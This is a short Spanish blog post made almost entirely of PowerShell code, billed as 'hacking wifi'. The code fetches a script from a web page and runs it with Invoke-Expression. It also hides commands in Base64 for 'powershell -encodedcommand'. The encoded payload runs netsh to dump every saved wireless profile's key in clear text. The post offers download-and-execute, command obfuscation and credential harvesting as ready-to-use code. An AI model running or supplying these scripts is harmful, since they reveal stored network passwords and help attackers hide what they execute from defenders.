# Hackear wifi con PowerShell (explicación codificando en Base64)
## PowerShell, Security 
### URL: https://www.jesusninoc.com/2017/02/22/hackear-wifi-con-powershell-explicacion-codificando-en-base64/
```PowerShell
#Código que se obtiene de la página web para sacar la contraseña del wifi
$codigo=((iwr 'https://www.jesusninoc.com/2017/01/31/hackear-wifi-con-powershell-script-en-una-linea/').AllElements | Where class -eq 'crayon-pre').innerText
$codigo

#Código codificado en Base64 para sacar la contraseña del wifi
$codigocargado=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($codigo))
$codigocargado

#Ejecutar el código codificado en Base64 para sacar la contraseña del wifi
Invoke-Expression "powershell -encodedcommand $codigocargado"
#Ejecutar el siguiente código codificado en Base64
Invoke-Expression "powershell -encodedcommand 'KABuAGUAdABzAGgAIAB3AGwAYQBuACAAcwBoAG8AdwAgAGkAbgB0AGUAcgBmAGEAYwBlACAAfAAgAFMAZQBsAGUAYwB0AC0AUwB0AHIAaQBuAGcAIABTAFMASQBEACkAWwAwAF0AIAB8ACAAJQB7AFsAUwB0AHIAaQBuAGcAXQAkAFMAUwBJAEQAPQAkAF8
AOwAkAFMAUwBJAEQAPQAkAFMAUwBJAEQALgByAGUAcABsAGEAYwBlACgAIgBTAFMASQBEACIALAAiACIAKQAuAHIAZQBwAGwAYQBjAGUAKAAiADoAIgAsACIAIgApAC4AdAByAGkAbQAoACkAOwAkAFMAUwBJAEQAOwBuAGUAdABzAGgAIAB3AGwAYQBuAC
AAcwBoAG8AdwAgAHAAcgBvAGYAaQBsAGUAIABuAGEAbQBlAD0AJABTAFMASQBEACAAawBlAHkAPQBjAGwAZQBhAHIAIAB8ACAAUwBlAGwAZQBjAHQALQBTAHQAcgBpAG4AZwAgACcAQwBvAG4AdABlAG4AaQBkAG8AIABkAGUAIABsAGEAIABjAGwAYQB2A
GUAJwA7AH0A'"

```
```PowerShell
#Código que se necesita para obtener el script de la página web para sacar la contraseña del wifi
$codigo="((iwr 'https://www.jesusninoc.com/2017/01/31/hackear-wifi-con-powershell-script-en-una-linea/').AllElements | Where class -eq 'crayon-pre').innerText"
$codigo
"######"

#Código codificado en Base64 para sacar la contraseña del wifi
$codigocargado=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($codigo))
$codigocargado
"######"

#Ejecutar el código codificado en Base64 para sacar la contraseña del wifi
[String]$codigoparaejecutar=(Invoke-Expression "powershell -encodedcommand 'KAAoAGkAdwByACAAJwBoAHQAdABwADoALwAvAHcAdwB3AC4AagBlAHMAdQBzAG4AaQBuAG8AYwAuAGMAbwBtAC8AMgAwADEANwAvADAAMQAvADMAMQAvAGgAYQBjAGsAZQBhAHIALQB3AGkAZgBpAC0AYwBvAG4ALQBwAG8AdwBlAHIAcwBoAGUAbABsAC0
AcwBjAHIAaQBwAHQALQBlAG4ALQB1AG4AYQAtAGwAaQBuAGUAYQAvACcAKQAuAEEAbABsAEUAbABlAG0AZQBuAHQAcwAgAHwAIABXAGgAZQByAGUAIABjAGwAYQBzAHMAIAAtAGUAcQAgACcAYwByAGEAeQBvAG4ALQBwAHIAZQAnACkALgBpAG4AbgBlAH
IAVABlAHgAdAA='")
Invoke-Expression $codigoparaejecutar.Replace("Vector smash protection is enabled. ","")

[String]$codigoparaejecutar=(Invoke-Expression "powershell -encodedcommand $codigocargado")
Invoke-Expression $codigoparaejecutar.Replace("Vector smash protection is enabled. ","")

```
